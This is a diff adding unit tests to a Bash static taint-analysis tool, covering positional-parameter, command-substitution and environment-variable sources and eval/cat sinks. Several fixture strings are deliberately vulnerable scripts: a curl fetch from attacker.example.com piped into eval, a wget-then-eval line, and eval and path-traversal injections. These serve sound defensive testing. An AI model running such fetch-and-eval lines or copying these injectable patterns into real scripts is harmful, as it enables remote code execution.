@@ -147,6 +147,139 @@ describe('Bash language-sources pattern rules', () => {
     });
   });
 
+  // ── Taint sources: positional parameters ────────────────────────────────
+
+  describe('positional parameter sources', () => {
+    it('$1 is registered as io_input source', async () => {
+      const code = 'user="$1"\neval "echo $user"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.variable === '1');
+      expect(sources.length).toBeGreaterThan(0);
+      expect(sources[0].type).toBe('io_input');
+    });
+
+    it('$@ is registered as io_input source', async () => {
+      const code = 'echo "$@"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.variable === '@');
+      expect(sources.length).toBeGreaterThan(0);
+    });
+
+    it('$1 has a synthetic DFG def with kind=param', async () => {
+      const code = 'user="$1"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const paramDef = result.dfg.defs.find(d => d.variable === '1' && d.kind === 'param');
+      expect(paramDef).toBeDefined();
+      expect(paramDef!.line).toBe(0); // synthetic, before any real code
+    });
+
+    it('def-use chain: $1 → user (via assignment)', async () => {
+      const code = 'user="$1"\neval "$user"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const chain = result.dfg.chains.find(c => c.via === '1');
+      expect(chain).toBeDefined();
+      // Chain from positional param def to user def
+      const userDef = result.dfg.defs.find(d => d.variable === 'user');
+      expect(chain!.to_def).toBe(userDef!.id);
+    });
+  });
+
+  // ── Taint sources: command substitution ─────────────────────────────────
+
+  describe('command substitution sources', () => {
+    it('$(curl ...) assignment is registered as network_input source', async () => {
+      const code = 'data=$(curl -s https://attacker.example.com/payload)\neval "$data"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'network_input' && s.variable === 'data');
+      expect(sources.length).toBeGreaterThan(0);
+    });
+
+    it('$(wget ...) assignment is registered as network_input source', async () => {
+      const code = 'payload=$(wget -qO- http://example.com)\neval "$payload"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'network_input' && s.variable === 'payload');
+      expect(sources.length).toBeGreaterThan(0);
+    });
+
+    it('$(cat ...) assignment is registered as file_input source', async () => {
+      const code = 'content=$(cat /etc/config)\neval "$content"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'file_input' && s.variable === 'content');
+      expect(sources.length).toBeGreaterThan(0);
+    });
+  });
+
+  // ── Taint sources: environment variables ────────────────────────────────
+
+  describe('environment variable sources', () => {
+    it('$USER_INPUT is registered as env_input (untrusted env pattern)', async () => {
+      const code = 'eval "echo $USER_INPUT"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'USER_INPUT');
+      expect(sources.length).toBeGreaterThan(0);
+    });
+
+    it('$HTTP_HOST is registered as env_input (CGI pattern)', async () => {
+      const code = 'echo "$HTTP_HOST"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'HTTP_HOST');
+      expect(sources.length).toBeGreaterThan(0);
+    });
+
+    it('$QUERY_STRING is registered as env_input', async () => {
+      const code = 'echo "$QUERY_STRING"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'QUERY_STRING');
+      expect(sources.length).toBeGreaterThan(0);
+    });
+
+    it('$HOME is NOT registered (safe env var)', async () => {
+      const code = 'echo "$HOME"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'HOME');
+      expect(sources.length).toBe(0);
+    });
+
+    it('locally assigned var is NOT flagged as env_input', async () => {
+      const code = 'USER_INPUT="safe"\necho "$USER_INPUT"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'USER_INPUT');
+      expect(sources.length).toBe(0);
+    });
+  });
+
+  // ── Reproducer tests (from handoff) ─────────────────────────────────────
+
+  describe('handoff reproducers', () => {
+    it('CWE-78/94: command injection via positional arg', async () => {
+      const code = '#!/bin/bash\nuser="$1"\neval "echo $user"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      expect(result.taint.sources.some(s => s.variable === '1')).toBe(true);
+      expect(result.taint.sinks.some(s => s.method === 'eval')).toBe(true);
+    });
+
+    it('CWE-22: path traversal via positional arg', async () => {
+      const code = '#!/bin/bash\nuser_path="$1"\ncat "/etc/app/$user_path"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      expect(result.taint.sources.some(s => s.variable === '1')).toBe(true);
+      expect(result.taint.sinks.some(s => s.method === 'cat')).toBe(true);
+    });
+
+    it('CWE-78: command injection via $(curl)', async () => {
+      const code = '#!/bin/bash\ndata=$(curl -s https://attacker.example.com/payload)\neval "$data"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      expect(result.taint.sources.some(s => s.type === 'network_input')).toBe(true);
+      expect(result.taint.sinks.some(s => s.method === 'eval')).toBe(true);
+    });
+
+    it('CWE-78: command injection via env var', async () => {
+      const code = '#!/bin/bash\neval "echo $USER_INPUT"';
+      const result = await analyze(code, 'script.sh', 'bash');
+      expect(result.taint.sources.some(s => s.type === 'env_input')).toBe(true);
+      expect(result.taint.sinks.some(s => s.method === 'eval')).toBe(true);
+    });
+  });
+
   // ── DFG integration ────────────────────────────────────────────────────
 
   describe('DFG integration', () => {
